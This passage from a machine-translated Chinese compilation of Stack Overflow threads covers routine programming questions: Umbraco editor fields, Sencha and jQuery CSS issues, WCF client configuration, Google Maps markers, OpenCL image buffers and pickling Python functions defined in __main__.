解决了！我将另一个 UIView 添加到 UIBarButtonItem，然后将 UIButton 添加到 UIView。我向 UIView 添加了一个触摸手势（并且还保留了 UIButton 的原始触摸事件），扩展了您可以触摸解决问题的按钮的区域。

# umbraco - Umbraco：确定谁最后更新了内容

> ID：11866914
> 
> 赞同：1
> 
> 时间：2012-08-08T14:37:54.253
> 
> 标签：umbraco

我在 API 中看到有一种方法可以获取 UpdateDate 字段。有没有办法确定谁对特定内容节点进行了最后一次更新？换句话说，最后编辑特定节点的人的用户 ID？

这是我尝试使用的一些代码：

```
Document[] releaseDocs = Document.GetRootDocuments();
User currentUser = User.GetCurrent();

foreach (var doc in releaseDocs)
{ 
   docPermissions = currentUser.GetPermissions(doc.Path);
   if ((docPermissions.Contains("F")) && (docPermissions.Contains("U")))
   {
      if (doc.HasPendingChanges())
      {
         if (doc.ParentId > -1)
         {
              lblPageContent += doc.Writer.Name;
         }
      }
   }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:57:37.713

我对此进行了更多研究，虽然 writerID 和 writerName 应该存储最后一个编辑器，但 Umbraco 中似乎存在一个错误。他们的支持建议创建一个使用编辑器用户数据更新的隐藏字段，所以这是我目前的临时工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:58:43.167

您可以尝试使用相同的方式`writerName`，如下所示：`writerID``UpdateDate`

如果你使用 Razor，你可以使用如下：

```
@Model.writerName
@Model.writerID 
```

在 XSLT 中：

```
<xsl:value-of select="$currentpage/@writerName" />
<xsl:value-of select="$currentpage/@writerID" /> 
```

在 C# 用户控件中：

```
using System;
using umbraco.NodeFactory;

namespace UmbracoTestingProj
{
    public partial class Default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            Node node = Node.GetCurrent();
            int writerId = node.WriterID;
            string wrtierName = node.WriterName;
        }
    }
} 
```

我希望这会有所帮助，

如果您有任何问题，请在下方评论

# css - 最新的 Chrome 更新搞砸了 Sencha Touch 2.0.0 的布局

> ID：11866916
> 
> 赞同：1
> 
> 时间：2012-08-08T14:37:56.360
> 
> 标签：css, google-chrome, layout, sencha-touch, sass

在 2012 年 7 月 31 日将 Chrome 更新到 21.0.1180.60 之后，我使用 Sencha Touch 2.0.0 构建的应用程序在浏览器中查看时开始出现许多问题。其中：背景图像不出现 - 或出现但尺寸错误。所有标题均以省略号显示。响应能力很差（！）我尝试将 Sencha 更新到其最新版本，但它引入了更多问题。

有人对最新版本的 Chrome 有疑问吗？

欢迎任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T15:02:44.957

在我的桌面上重新启动 Chrome 并将其自身更新到 v21 后，我在标题中的省略号遇到了同样的问题。这似乎是 Sencha Touch 2.0 的 CSS 问题，已在 2.1.0 b2 中修复。另请参阅[Sencha Touch 论坛](http://www.sencha.com/forum/showthread.php?234556-Chrome-21-All-titles-are-displayed-with-ellipsis-%28ST2-2.0.1.1%29)。

目前的解决方法是包含以下 CSS：

```
.x-title { padding:0 .3em; }
.x-title .x-innerhtml { padding: 0; } 
```

关于其他问题，恐怕我无能为力。

# c# - Commerce Server 2007 OrderObjectMappings 定义错误

> ID：11866918
> 
> 赞同：0
> 
> 时间：2012-08-08T14:37:57.047
> 
> 标签：c#, asp.net, commerceserver2007

我正在向我的 PurchaseOrder 对象添加 3 个新属性，并且已经完成了将 3 个新列添加到数据库表、更新 PurchaseOrder 类以及最后是 OrderObjectMappings.xml 文件以确保类中的属性正确映射到数据库的过程. 一切看起来都是正确的，但是当商业服务器尝试映射时出现以下错误：

> [MappedClassDataMismatchException：表 PurchaseOrders 列 ConcessionOrder 与映射中定义的预期列名称 MarshalledData 不匹配。]
> Microsoft.CommerceServer.Runtime.Orders.POLoader.LoadFromDataSetHelper(DataSet dataSet, ClassInfo[] dependencyClassList, Int32 depClassListLen, Hashtable[] depInstanceLookup, BinaryFormatter 格式化程序, 字符串过滤器) +3406
> Microsoft.CommerceServer.Runtime.Orders.POLoader.LoadFromDataSet(DataSet dataSet, OrderGroupCollection ogColl) +1080
> Microsoft.CommerceServer.Runtime.Orders.POLoader.LoadSearchSet(Guid searchSetId, OrderGroupCollection ogc) +388
> Microsoft.CommerceServer。 Runtime.Orders.POLoader.Load(String storedProcName, ListDictionary sqlParameters) +458
> Microsoft.CommerceServer.Runtime.Orders.OrderContext.GetPurchaseOrdersForUser(Guid userId) +352

ConcessionOrder 是我的新属性之一，并在 xml 文件中正确映射。有谁知道为什么会发生这种情况的任何明显原因，我可能错过了一些东西，其他地方的另一个设置？

干杯，约翰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T18:58:34.360

您可能想要检查是否更新了 OrderObjectMappings.xml 中的所有位置

例如在这个节点

```
<ClassTableMap Class="PurchaseOrder" Table="PurchaseOrders"> 
```

中的一个

```
<PropertyMap ... /> 
```

线可能是错的？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-06T20:58:42.460

**OrderObjectMapping.xml**文件的**StorageMap**根元素有 3 个子元素，它们处理表和类之间以及表列和类属性之间的映射。

 **## 表节点

**Tables**元素将每个子**Table**元素映射到一个物理数据库表。每个子**Column**元素都映射到一个物理数据库字段。

## 类节点

**Classes**元素包含一个子**Class**元素，对应于每个 Commerce Server 2007 API 类。开箱即用的属性和您对属性列表的扩展作为子**属性**元素存在。

## 映射节点

**Mappings**元素负责将 Tables 元素中的每个子Table**元素****映射**到**Classes**元素的子**Class**元素。此元素驱动物理数据库表及其列到该类的类和子属性的映射。

 ******为了扩展 OrderObjectMapping.xml 文件中的 PurchaseOrder 设置以包含新的“ **ConcessionOrder** ”属性，您的文件需要包含对**Tables**、**Classes**和**Mappings**元素的修改，如下所示。

注意：我假设您正在使用一个位字段来模拟布尔 ConcessionOrder 属性...

![在此处输入图像描述](../Images/fa809cb7a8d248da81fc309fda120721.png)********

# c# - 试图让 C# 客户端与本地主机上的 Web 服务通信

> ID：11866924
> 
> 赞同：0
> 
> 时间：2012-08-08T14:38:21.920
> 
> 标签：c#, visual-studio-2010, web-services, wsdl

我有一个未记录的 Web 服务，我需要使用用 Visual C# 编写的客户端来获取此 Web 服务的版本。问题是我太菜鸟了。

我在 Visual Studio 中添加了服务引用，所以我得到了一个代理文件和 output.config 文件。

我从 VS 得到这一行来启动该类的新实例：

```
DentalScannerServiceClient client = new DentalScannerServiceClient(); 
```

所以我把它放在我的控制台应用程序中：

```
DentalScannerServiceClient client = new DentalScannerServiceClient();
client.GetSoftwareVersion(); 
```

收到错误“方法 'GetSoftwareVersion' 没有重载需要 0 个参数”。当我开始输入 client.GetSoftwareVersion 时，Intelisens 会告诉我这一点：

状态 DentalScannerServiceClient.GetSoftwareVersion（**输出字符串版本**）

所以我试试这段代码：

```
 DentalScannerServiceClient client = new DentalScannerServiceClient();
    string oo;
    client.GetSoftwareVersion(out oo); 
```

然后打印字符串，但是当我运行代码时出现此错误：

*"InvalidOperationException 未处理" "在 ServiceModel 客户端配置部分中找不到引用合同 'IDentalScannerService' 的默认端点元素。这可能是因为找不到您的应用程序的配置文件，或者因为找不到与此合同匹配的端点元素客户元素。* ”

任何想法如何解决这个问题或从哪里开始寻找？我很感谢任何帮助。也许这很简单。我对 C# 的经验也很少。

**应用程序配置：**

```
<?xml version="1.0"?>
<configuration>
<configSections>
    <sectionGroup name="applicationSettings" type="System.Configuration.ApplicationSettingsGroup, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <section name="ThisIsTest.Properties.Settings" type="System.Configuration.ClientSettingsSection, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false"/>
    </sectionGroup>
</configSections>
<startup><supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/></startup><applicationSettings>
        <ThisIsTest.Properties.Settings>
            <setting name="ThisIsTest_localhost_DentalScannerService" serializeAs="String">
                <value>http://localhost:8731/DentalServiceLib/DentalScannerService/</value>
            </setting>
        </ThisIsTest.Properties.Settings>
    </applicationSettings>
    <system.serviceModel>
        <bindings>
            <basicHttpBinding>
                <binding name="BasicEndPoint" closeTimeout="00:01:00" openTimeout="00:01:00"
                    receiveTimeout="00:10:00" sendTimeout="00:01:00" allowCookies="false"
                    bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
                    maxBufferSize="65536" maxBufferPoolSize="524288" maxReceivedMessageSize="65536"
                    messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered"
                    useDefaultWebProxy="true">
                    <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384"
                        maxBytesPerRead="4096" maxNameTableCharCount="16384" />
                    <security mode="None">
                        <transport clientCredentialType="None" proxyCredentialType="None"
                            realm="" />
                        <message clientCredentialType="UserName" algorithmSuite="Default" />
                    </security>
                </binding>
            </basicHttpBinding>
        </bindings>
        <client>
            <endpoint address="http://localhost:8731/DentalServiceLib/DentalScannerService/"
                binding="basicHttpBinding" bindingConfiguration="BasicEndPoint"
                contract="Scanner.IDentalScannerService" name="BasicEndPoint" />
        </client>
    </system.serviceModel>
</configuration> 
```

**output.config（从 wsdl.exe 得到这个，只是做了** *Project->Add Existing Item*来添加它：

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <system.serviceModel>
        <bindings>
            <basicHttpBinding>
                <binding name="BasicEndPoint" closeTimeout="00:01:00" openTimeout="00:01:00"
                    receiveTimeout="00:10:00" sendTimeout="00:01:00" allowCookies="false"
                    bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
                    maxBufferSize="65536" maxBufferPoolSize="524288" maxReceivedMessageSize="65536"
                    messageEncoding="Text" textEncoding="utf-8" transferMode="Buffered"
                    useDefaultWebProxy="true">
                    <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384"
                        maxBytesPerRead="4096" maxNameTableCharCount="16384" />
                    <security mode="None">
                        <transport clientCredentialType="None" proxyCredentialType="None"
                            realm="" />
                        <message clientCredentialType="UserName" algorithmSuite="Default" />
                    </security>
                </binding>
            </basicHttpBinding>
        </bindings>
        <client>
            <endpoint address="http://localhost:8731/DentalServiceLib/DentalScannerService/"
                binding="basicHttpBinding" bindingConfiguration="BasicEndPoint"
                contract="IDentalScannerService" name="BasicEndPoint" />
        </client>
    </system.serviceModel>
</configuration> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:40:49.477

这很可能是由于端点多次出现在您的配置文件中。找到该部分`<system.serviceModel><client></client></system.serviceModel>`并检查重复项（基于名称）

如果客户端部分根本不存在于您的配置文件中，您将需要添加它。按照这个模板

```
<configuration>
    <system.serviceModel>
        <client>
            <endpoint address="<address here>" binding="basicHttpBinding" contract="<full qualifeid class name to client interface>" name="<some name here>" />
        </client>
    </system.serviceModel>
</configuration> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T07:02:30.390

由于我无法使用此方法，因此我采用了另一种方法：

1.  使用 SDK 中 wsdl.exe 生成的 .wsdl 文件
2.  下载了**soapUI**并以wsdl文件作为初始文件开始了一个新项目
3.  soapUI 为 Web 服务中的所有对象创建了 SOAP 请求
4.  在soapUI中测试了不同的调用并得到了实时响应
5.  进入 C# VS 并让我的控制台应用程序首先启动 Web 服务，然后使用 HttpWebRequest 发送简单的 SOAP 请求
6.  答对了

这种方法效果出奇的好！

# php - 如何将javascript数组分配给php数组

> ID：11866927
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:38:29.503
> 
> 标签：php, javascript, ajax, arrays, json

> **可能重复：**
> [javascript 数组转换为 php 数组？](https://stackoverflow.com/questions/9880904/javascript-array-converted-to-a-php-array)

我在javascript中有一个数组，现在我需要将javascript数组分配给php数组
我是脚本语言的初学者，

任何人都可以帮助我
提前谢谢。

```
<script type = text/javascript >
var jsArray = [];
var jsDescArray =   [];
 for (var i = 0; i <= <?php echo $t_num ?>; i++) {
     jsArray.push( "<?php echo $url ?>="+thread[i].id  );
     jsDescArray.push( thread[i].title );
}
<?php
$str=json_decode('jsArray'); 
$str1[] = json_decode( 'jsDescArray', true );
?>
</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:41:07.013

首先，在服务器端扫描和处理 PHP 代码很久之后，在客户端评估 Javascript。因此，这种类型的代码根本无法工作。

其次，这真的没有理由。因为您在赋值之前用 Javascript 填充数组，所以您实际上应该将变量 ( `$url`) 直接传递到`$str`and`$str1[]`中。如果这是必须在客户端处理的事情，请`.php`使用 AJAX 调用并从文件中检索数据，以传输您的 Javascript 数组。

**参考**：[https ://developer.mozilla.org/en-US/docs/AJAX](https://developer.mozilla.org/en-US/docs/AJAX)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:41:33.253

PHP 在服务器上运行，并将结果发送到浏览器。只有这样才能运行 JavaScript。

要将内容从 JavaScript 发送回服务器，您需要使用 AJAX 或类似工具。您可能想重新考虑解决问题的方法，但这实际上取决于您在这里尝试做的事情的背景。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:44:18.670

您可以使用`JSON.stringify(array`) 在 JavaScript 中对数组进行编码，然后`$array=json_decode($_POST['jsondata']);`在 PHP 脚本中使用来检索它。

见网址

[传递 Javascript 数组 -> PHP](https://stackoverflow.com/questions/5035547/pass-javascript-array-php)

# jquery - 简单的 Datepicker 代码兼容性问题 - 适用于 Firefox 6.0.2 和 IE9.0.8，不适用于最新的 chrome 或 IE8

> ID：11866928
> 
> 赞同：0
> 
> 时间：2012-08-08T14:38:34.807
> 
> 标签：jquery, cross-browser, datepicker, compatibility, jquery-ui-datepicker

我有以下代码：

```
<form id="form1" runat="server">

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.6.4/jquery-ui.min.js"></script>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>

<script  type="text/javascript">
    $(function () {
        $("#datepicker1").datepicker({

        })
    })
</script>

<div class="demo">

   <p>Date: <input type="text" id="datepicker1"></p>

</div>
</form> 
```

我试过 1.7.2 版本，同样的问题。这是一个更大的解决方案的一部分，这正是我将问题归结为的原因。我不知道为什么其他浏览器不使用这个，任何帮助将不胜感激。还有，第一次发帖。（我确实找到了其他关于兼容性的帖子，但没有这么简单的东西可以帮助我理解为什么这些东西不起作用。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T15:31:31.393

解决方案很奇怪，也许有一个单独的原因，但我只是停止按地址引用 .js 文件并将它们保存到服务器本地。没有更多的问题。

# jquery - 在 jquery .show() 上触发 CSS3 动画

> ID：11866929
> 
> 赞同：0
> 
> 时间：2012-08-08T14:38:36.290
> 
> 标签：jquery, css, css-animations

我准备了一个漂亮的三部分式 iPhone 式“pop”动画，准备使用一个“太长”的错误来呈现给用户。要使用它，我只需在隐藏的错误 div 上调用 .show() 即可。在 Safari 下它运行得很好，但在 Firefox 下它只是砰的一声落地，完全跳过动画，只是做一个普通的旧 .show()。

我该怎么做才能让它在 Mozilla 下也能正常工作？

相关的CSS：

```
@-webkit-keyframes pop-in {
    0% { opacity: 0;-moz-transform: scale(0);-webkit-transform: scale(0); }
    50% { opacity: 1;-moz-transform: scale(1.5);-webkit-transform: scale(1.5); }
    100% { opacity: 1;-moz-transform: scale(1);-webkit-transform: scale(1); }
}

@-moz-keyframes pop-in {
    0% { opacity: 0;-moz-transform: scale(0);-webkit-transform: scale(0); }
    50% { opacity: 1;-moz-transform: scale(1.5);-webkit-transform: scale(1.5); }
    100% { opacity: 1;-moz-transform: scale(1);-webkit-transform: scale(1); }
}

@-ms-keyframes pop-in {
    0% { opacity: 0;-moz-transform: scale(0);-webkit-transform: scale(0); }
    50% { opacity: 1;-moz-transform: scale(1.5);-webkit-transform: scale(1.5); }
    100% { opacity: 1;-moz-transform: scale(1);-webkit-transform: scale(1); }
}

@keyframes pop-in {
    0% { opacity: 0;transform: scale(0);transform: scale(0); }
    50% { opacity: 1;transform: scale(1.5);transform: scale(1.5); }
    100% { opacity: 1;transform: scale(1);transform: scale(1); }
}

#error {
    ...
    -webkit-animation:pop-in 0.3s;
    -moz-animation:pop-in 0.3s;
    -ms-animation:pop-in 0.3s;
    animation:pop-in 0.3s;
    ...
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:41:11.743

只需将您的选择器设置为 #error.active 并在显示元素后添加 .active 类..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-18T14:53:36.113

jquery.show() 的默认持续时间为 400。

使用 jquery.show(0); 然后通过 $("#idElement").addClass("myOpacityClass"); 使用 css 不透明度为您的元素设置动画

# java - Java 从 RTF 获取纯文本

> ID：11866935
> 
> 赞同：4
> 
> 时间：2012-08-08T14:38:44.643
> 
> 标签：java, rtf

我的数据库中有一个包含 RTF 格式文本的列。如何使用 Java 仅获取它的纯文本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-04-07T20:10:36.490

```
RTFEditorKit rtfParser = new RTFEditorKit();
Document document = rtfParser.createDefaultDocument();
rtfParser.read(new ByteArrayInputStream(rtfBytes), document, 0);
String text = document.getText(0, document.getLength()); 
```

这应该工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T15:13:29.037

如果您可以尝试“AdvancedRTFEditorKit”，它可能会很酷。试试这里[http://java-sl.com/advanced_rtf_editor_kit.html](http://java-sl.com/advanced_rtf_editor_kit.html)

我已经用它创建了一个完整的 RTF 编辑器，具有 MS Word 的所有支持。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T15:27:28.913

Apache POI 还将读取 Microsoft Word 格式，而不仅仅是 RTF。

[兴趣点](http://poi.apache.org/index.html)

```
import org.apache.poi.hwpf.HWPFDocument;
import org.apache.poi.hwpf.extractor.WordExtractor;

public String getRtfText(String fileName) {
   File rtfFile = null;
   WordExtractor rtfExtractor = null ;

   try {
    rtfFile = new File(fileName);

    //A FileInputStream obtains input bytes from a file.
    FileInputStream inStream = new FileInputStream(rtfFile.getAbsolutePath());

    //A HWPFDocument used to read document file from FileInputStream
    HWPFDocument doc=new HWPFDocument(inStream);

    rtfExtractor = new WordExtractor(doc);
   }
   catch(Exception ex)
   {
    System.out.println(ex.getMessage());
   }

    //This Array stores each line from the document file.
    String [] rtfArray = rtfExtractor.getParagraphText();

    String rtfString = "";

    for(int i=0; i < rtfArray.length; i++) rtfString += rtfArray[i];

    System.out.println(rtfString);
    return rtfString;
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-11-22T11:03:44.780

如果 RTF 文本位于 JEditorPane 中，则此方法有效

```
String s = getPlainText(aJEditorPane.getDocument());

String getPlainText(Document doc) {
    try {
        return doc.getText(0, doc.getLength());
    }
    catch (BadLocationException ex) {
        System.err.println(ex);
        return null;
    }
} 
```

# javascript - 由于标记对象，Google 地图无法加载

> ID：11866939
> 
> 赞同：0
> 
> 时间：2012-08-08T14:38:52.373
> 
> 标签：javascript, jquery, html, google-maps, geolocation

地图在没有标记对象的情况下正确加载，但是当我在此结构上添加标记对象时它不会加载我的

```
<!doctype html>
<html>
    <head>
    <script type="text/javascript"
    src="http://maps.google.com/maps/api/js?sensor=false"></script>

    <script src="jquery-1.7.2.min.js" type="text/javascript"></script>
    <script src="script.js" type="text/javascript"></script>
    <script type="text/javascript"> 

        $.geolocation.find(function(location) {
            var lat = location.latitude;
            var lng = location.longitude;

            var map = new google.maps.Map($('#mapDiv').get(0), {
                center: new google.maps.LatLng(lat, lng),
                zoom: 13,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            });

            var pinColor = "FE7569";
            var pinImage = new google.maps.MarkerImage("http://chart.apis.google.com/chart?chst=d_map_pin_letter&chld=%E2%80%A2" + pinColor,
            new google.maps.Size(21, 34),
            new google.maps.Point(0,0),
            new google.maps.Point(10, 34));
            var pinShadow = new google.maps.MarkerImage("http://chart.apis.google.com/chart?chst=d_map_pin_shadow",
            new google.maps.Size(40, 37),
            new google.maps.Point(0, 0),
            new google.maps.Point(12, 35))

            var marker= new google.maps.Marker({
                position: new google.maps.LatLng(lat, lng),
                map: map,
                icon: pinImage,
                shadow: pinShadow 
            });        
        });
    </script>
</head>
 <body>
    <div id="mapDiv" style="width:700px; height: 500px;"></div>
 </body>
</html> 
```

页面 script.js 中包含的脚本

```
 (function($){

            $.extend($.support,{
                geolocation:function(){
                    return $.geolocation.support();
                }
            });

            $.geolocation = {        
                find:function(success, error, options){
                    if($.geolocation.support()){
                        options = $.extend({highAccuracy: true, track: false}, options);
                        ($.geolocation.object())[(options.track ? 'watchPosition' : 'getCurrentPosition')](function(location){
                            success(location.coords);
                        }, function(){
                            error();
                        }, {enableHighAccuracy: options.highAccuracy});     
                    }else{
                        error();                
                    }
                },
                object:function(){
                    return navigator.geolocation;
                },
                support:function(){
                    return ($.geolocation.object()) ? true : false;
                }
            };

        })(jQuery); 
```

我需要在谷歌地图中包含标记，另一个问题是此代码仅在 Firefox 和 IE 上运行，但不能在 Google Chrome 上运行

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:26:03.190

看看这个，我认为这已经解决了，你的错误在 url 参数中，现在它也在 Chrome 中工作。`FE7569`您还可以根据需要通过更换来更改标记的颜色。

**例如：** `73B5EB` ![在此处输入图像描述](../Images/cb5c1815f2f5098868ab35e6c491fb67.png) **或** `33DE61` ![在此处输入图像描述](../Images/715aa19acdb79b20e9f3783afa97bc83.png)

您可以做的另一件事是将文本放入标记中，如下所示：

[http://chart.apis.google.com/chart?chst=d_map_pin_letter&chld=You%20are%20here|FE7569](http://chart.apis.google.com/chart?chst=d_map_pin_letter&chld=You%20are%20here|FE7569)

**例如：** ![在此处输入图像描述](../Images/a685c3154c6630c8bd979cb85b81da8b.png)

* * *

**您的代码的实时演示，但已更正：**

[http://jsfiddle.net/oscarj24/sPsxh/](http://jsfiddle.net/oscarj24/sPsxh/)

希望这可以帮助 ：-）

# opencl - GPU上的enqueueWriteImage失败

> ID：11866942
> 
> 赞同：0
> 
> 时间：2012-08-08T14:39:04.257
> 
> 标签：opencl, gpgpu

我正在开发一些适用于图像缓冲区的内核。问题是，当我通过直接复制图像数据来创建 Image2D 时，一切正常。

如果我尝试将写入队列到我的图像缓冲区，它将不适用于我的 GPU。

这是一个基本的内核：

```
__kernel void myKernel(__read_only image2d_t in, __write_only image2d_t out) {
    const int x = get_global_id(0);
    const int y = get_global_id(1);
    const sampler_t sampler = CLK_NORMALIZED_COORDS_FALSE | CLK_CLAMP_TO_EDGE | CLK_FILTER_NEAREST;

    uint4 pixel = read_imageui(in, sampler, (int2)(x, y));
    write_imageui(out, (int2)(x, y), pixel);
} 
```

好吧，那个简单的内核在我的 GPU 上给了我一个黑色图像，但在我的 CPU 上运行良好。

为了使它工作，我必须释放缓冲区图像并通过使用`CL_MEM_COPY_HOST_PTR`. 我使用良好的数据格式：CL_RGBA、CL_UNSIGNED_INT8，而且我的图像大小很好。

JOCL 和 API 的 C++ 绑定遇到了问题。（我没有测试 C API）。

最后，它通过重新创建缓冲区来运行，但这是个好主意吗？这只是正常的吗？我可以执行哪些操作来避免它？

顺便说一句，我在 Intel SDK for OpenCL（Intel Core I7）和 ATI AMD APP SDK（HD6800）上运行。

[编辑]

这是我用来写入缓冲区的代码。

一、分配部分：

```
cl_image_format imageFormat = new cl_image_format();
imageFormat.image_channel_order = CL_RGBA;
imageFormat.image_channel_data_type = CL_UNSIGNED_INT8;

inputImageMem = clCreateImage2D(
    context, CL_MEM_READ_ONLY,
    new cl_image_format[]{imageFormat}, imageSizeX, imageSizeY,
    0, null, null); 
```

并且在运行时，为每一帧调用在 GPU 上不起作用的部分：

```
clEnqueueWriteImage(commandQueue, inputImageMem, CL_TRUE, new long[]{0, 0, 0},
        new long[]{imageSizeX, imageSizeY, 1}, 0, 0,
        Pointer.to(data), 0, null, null); 
```

在 GPU 和 CPU 上工作但强制我重新创建缓冲区的部分：

```
clReleaseMemObject(inputImageMem);
cl_image_format imageFormat = new cl_image_format();
imageFormat.image_channel_order = CL_RGBA;
imageFormat.image_channel_data_type = CL_UNSIGNED_INT8;
inputImageMem = clCreateImage2D(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, new cl_image_format[]{imageFormat}, imageSizeX, imageSizeY, 0, Pointer.to(data), null); 
```

发送的数据是一个大小为 int 的数组`imageSizeX*imageSizeY`。我通过这段代码得到它：

```
DataBufferInt dataBuffer = (DataBufferInt)image.getRaster().getDataBuffer();
int data[] = dataBuffer.getData(); 
```

上面的代码是在使用 JOCL 的 java 中，同样的问题出现在另一个使用 C++ OpenCL Wrapper 的 C++ 程序中。唯一的区别是在 Java 中虚拟机崩溃（在 3~4 帧之后），而在 C++ 中，结果是黑色图像。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-10T11:51:48.717

嗯，我发现了问题。那是我的司机表现得很奇怪。

我使用的是12.4版本（我开始使用OpenCL时安装的版本），我刚刚安装了12.6版本，问题就消失了。

所以，让你的驱动程序保持最新！

# python - 如何腌制__main__（python）中定义的函数/类

> ID：11866944
> 
> 赞同：9
> 
> 时间：2012-08-08T14:39:10.033
> 
> 标签：python, pickle

我希望能够从 __main__ 中腌制一个函数或类，但有一个明显的问题（在其他帖子中提到），腌制的函数/类位于 __main__ 命名空间中，而在另一个脚本/模块中取消腌制将失败。

我有以下可行的解决方案，是否有理由不这样做？

以下在 myscript.py 中：

```
import myscript
import pickle

if __name__ == "__main__":               

    print pickle.dumps(myscript.myclass())

else:

    class myclass:
        pass 
```

**编辑**： unpickling 将在一个脚本/模块中完成，该脚本/模块可以*访问*myscript.py 并且可以执行`import myscript`. 目的是使用[并行 python](http://www.parallelpython.com/ "并行蟒蛇")之类的解决方案来远程调用函数，并能够编写一个简短的*独立*脚本，其中包含可以远程访问的函数/类。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-12-30T17:20:47.120

Pickle 似乎着眼于类和函数定义的**主要**范围。从您要从中提取的模块内部，试试这个：

```
import myscript
import __main__
__main__.myclass = myscript.myclass
#unpickle anywhere after this 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-17T13:56:41.437

`__main__`通过导入和使用该模块中可用的方法，您可以更好地处理全局对象。这就是[dill](http://pythonhosted.org/dill)所做的，以便在 python 中序列化几乎任何东西。基本上，当 dill 序列化一个交互式定义的函数时，它会`__main__`在序列化和反序列化端使用一些名称修饰，从而`__main__`生成一个有效的模块。

```
>>> import dill
>>> 
>>> def bar(x):
...   return foo(x) + x
... 
>>> def foo(x):
...   return x**2
... 
>>> bar(3)
12
>>> 
>>> _bar = dill.loads(dill.dumps(bar))
>>> _bar(3)
12 
```

实际上，dill 将它的类型注册到`pickle`注册表中，所以如果您有一些使用的黑盒代码`pickle`并且您不能真正编辑它，那么只需导入 dill 就可以神奇地使其工作，而无需猴子修补第 3 方代码。

或者，如果您希望将整个解释器会话作为“python 图像”发送，dill 也可以这样做。

```
>>> # continuing from above
>>> dill.dump_session('foobar.pkl')
>>>
>>> ^D
dude@sakurai>$ python
Python 2.7.5 (default, Sep 30 2013, 20:15:49) 
[GCC 4.2.1 (Apple Inc. build 5566)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import dill
>>> dill.load_session('foobar.pkl')
>>> _bar(3)
12 
```

您可以轻松地将图像通过 ssh 发送到另一台计算机，然后从您离开的地方开始，只要存在 pickle 的版本兼容性以及关于 python 更改和正在安装的东西的常见警告。

[我实际上使用 dill 序列化对象并使用并行 python](http://www.parallelpython.com/)、 multiprocessing 和[mpi4py](https://bitbucket.org/mpi4py/mpi4py)跨并行资源发送它们。我将这些方便地汇总到[pathos](http://pythonhosted.org/pathos)包中（以及用于 MPI 的[pyina](http://pythonhosted.org/pyina)`map` ），它为不同的并行批处理后端提供了统一的接口。

```
>>> # continued from above
>>> from pathos.multiprocessing import ProcessingPool as Pool
>>> Pool(4).map(foo, range(10))
[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]
>>>
>>> from pyina.launchers import MpiPool
>>> MpiPool(4).map(foo, range(10))
[0, 1, 4, 9, 16, 25, 36, 49, 64, 81] 
```

还有非阻塞和迭代映射以及非平行管道连接。我也有一个 pathos 模块`pp`，但是对于`__main__`. 我正在努力改进它。如果你愿意，可以[在 github 上 fork 代码](https://www.github.com/uqfoundation)并帮助`pp`改进`__main__`. `pp`不能很好地腌制的原因是`pp`它通过使用临时文件对象和读取解释器会话的历史来进行序列化技巧......所以它不会以与多处理或 mpi4py 相同的方式序列化对象。我有一个 dill 模块`dill.source`，可以无缝地执行与使用相同类型的酸洗`pp`，但它是相当新的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T15:07:11.147

如果你试图腌制一些东西，以便你可以在其他地方使用它，与 分开`test_script`，那是行不通的，因为 pickle （显然）只是试图从模块中加载函数。这是一个例子：

test_script.py

```
def my_awesome_function(x, y, z):
    return x + y + z 
```

泡菜脚本.py

```
import pickle
import test_script
with open("awesome.pickle", "wb") as f:
    pickle.dump(test_script.my_awesome_function, f) 
```

如果你运行`python picklescript.py`，然后更改文件名`test_script`，当你尝试加载函数时，它会失败。例如

运行这个：

```
import pickle
with open("awesome.pickle", "rb") as f:
    pickle.load(f) 
```

将为您提供以下回溯：

```
Traceback (most recent call last):
  File "load_pickle.py", line 3, in <module>
    pickle.load(f)
  File "/Library/Frameworks/Python.framework/Versions/7.3/lib/python2.7/pickle.py", line 1378, in load
    return Unpickler(file).load()
  File "/Library/Frameworks/Python.framework/Versions/7.3/lib/python2.7/pickle.py", line 858, in load
    dispatch[key](self)
  File "/Library/Frameworks/Python.framework/Versions/7.3/lib/python2.7/pickle.py", line 1090, in load_global
